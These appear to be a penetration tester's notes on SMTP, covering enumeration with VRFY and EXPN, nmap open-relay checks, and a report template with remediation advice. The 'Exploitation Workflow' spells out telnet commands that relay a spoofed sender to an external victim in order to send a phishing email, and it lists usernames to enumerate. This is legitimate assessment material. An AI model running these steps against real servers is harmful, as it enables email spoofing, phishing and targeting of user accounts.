**What & Where**
- Sends emails between servers/clients
- Port 25 (standard), 587 (submission/auth), 465 (SSL/TLS)
- Unencrypted by default (plaintext commands/data)

**How It Works**
- Client (MUA) → Submission Agent (MSA) → Relay (MTA) → Delivery Agent (MDA) → Mailbox
- HELO/EHLO starts session
- MAIL FROM, RCPT TO, DATA sends the email
- STARTTLS upgrades to encrypted connection

**Why This Matters**
- Unencrypted = can sniff credentials/emails
- User enumeration possible (VRFY command)
- Open relay = send spoofed emails as anyone

***Quick Enumeration***
**Connect Manually:**
- telnet [IP] 25

**Start Session:**
- HELO [anything]
- EHLO [anything]
	- EHLO shows more info (extensions supported)

***User Enumeration:***
**VRFY [username]**
- 252 response = user might exist (not 100% reliable)
- 550 response = user doesn't exist
- Some servers disable this (security)

***Alternative Enum:***
**EXPN [username]**
- Similar to VRFY, checks mailing list membership

***Nmap Scan:***
**nmap -sV -p25 -sC [IP]**
- smtp-commands script shows supported commands

**Check Open Relay:**
nmap -p25 --script smtp-open-relay [IP]
- Tests if server relays emails for anyone (spam risk)

***Dangerous Configurations***
**Open Relay**
- what: mynetworks = 0.0.0.0/0 (allows anyone to relay)
- why dangerous: attacker sends spoofed emails through trusted server
- impact: spam, phishing, email spoofing
- test: nmap --script smtp-open-relay [IP]
- exploit: telnet in, MAIL FROM any address, RCPT TO any recipient

**User Enumeration via VRFY**
- what: VRFY command confirms if user exists
- why dangerous: attacker builds list of valid usernames
- impact: target users for phishing/brute force
- test: VRFY [common_names] via telnet
- note: many modern servers disable this

**Unencrypted Credentials**
- what: SMTP auth sent in plaintext (if no STARTTLS)
- why dangerous: credentials sniffable on network
- test: check if STARTTLS is offered in EHLO response

***Exploitation Workflow***
**Step 1: Scan**
nmap -sV -p25 -sC [IP]

**Step 2: Connect Manually**
telnet [IP] 25
- EHLO test

**Step 3: Enumerate Users**
VRFY root
VRFY admin
VRFY [common_usernames]
- Note which return 252 (valid) vs 550 (invalid)

**Step 4: Check Open Relay**
nmap -p25 --script smtp-open-relay [IP]
- If vulnerable: can send spoofed emails

**Step 5: Exploit Open Relay (if found)**
telnet [IP] 25
MAIL FROM: <fake@company.com>
RCPT TO: <victim@external.com>
DATA
[write phishing email]
.
QUIT

**Step 6: Check for STARTTLS**
EHLO test
- Look for STARTTLS in response
- If missing = unencrypted auth possible

**Commands Reference**
HELO/EHLO    - start session
MAIL FROM    - sender address
RCPT TO      - recipient address
DATA         - start email content
VRFY         - check if user exists
EXPN         - check mailing list membership
RSET         - abort current transmission
NOOP         - keep connection alive
QUIT         - end session

***Report Template***
**vulnerability:** smtp open relay
**severity:** medium-high
**description:** SMTP server on [IP]:25 allows email relay from any source, enabling email spoofing and spam.

**Steps To Reproduce:**
1. telnet [IP] 25
2. MAIL FROM: <spoofed@anywhere.com>
3. RCPT TO: <target@external-domain.com>
4. Server accepts without authentication

**Impact:** attacker can send spoofed emails appearing to come from the company domain, enabling phishing attacks and spam campaigns

**Remediation:**
1. Restrict mynetworks to trusted IP ranges only
2. Require authentication for relay
3. Implement SPF, DKIM, DMARC records

**Remember**
- VRFY user enum is unreliable (many servers lie or disable it)
- Open relay = biggest SMTP vulnerability to check
- Always try manual telnet first, understand what's happening
- nmap scripts automate what you'd do manually